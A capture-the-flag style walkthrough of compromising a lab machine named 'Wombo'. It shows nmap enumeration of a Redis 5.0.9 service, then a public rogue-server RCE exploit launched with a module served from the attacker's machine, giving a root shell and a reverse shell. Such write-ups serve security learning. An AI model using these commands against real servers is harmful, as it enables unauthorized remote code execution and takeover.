Wombo

Target IP: 192.168.171.69

Challenge Description: Wombo is full of the freshest hipster tech around.

Reconnaissance


Performing an nmap scan shows the TCP ports above open on the target machine.

Enumeration, Exploitation, and Flag.

Port 6379: Redis

After enumerating the different ports and finding nothing important -- I decided to enumerate this application. I used the command nmap --script redis-info -sV -p 6379 192.168.171.69 to find more information about the application, and obtained the result above. The target machine is running Linux 4.9.0-12-amd64 x86_64. And the Redis application version seems to be 5.0.9.


After searching for public exploits against this application lead to me the Github repository above. This exploit seems to target all Redis 4.x/5.x applications. And this repository contains more information on how to use the exploit. I downloaded this exploit on my machine.


Before firing the exploit against the target machine, I followed the instructions under the Usage section in the image above for the exploit. I downloaded a copy of the RedisModules-ExecuteCommand from this link and compiled the exp.so.


Then I copied the compiled exp.so file to directory of the Redis RCE, as shown above. Time to exploit it now.


Using the command ./exp.py -r 192.168.171.69 -L 192.168.45.228 -p 6379 -P 6379 -f exp.so, I launched the exploit against the target machine and got a hit! Upon exploitation, I used the interactive shell mode. Now I have a root shell on the target machine.


I used the reverse shell mode and obtained the result above. In the picture above, I obtained a reverse shell connection on port 80 on my machine. The flag is shown above in the bottom terminal.
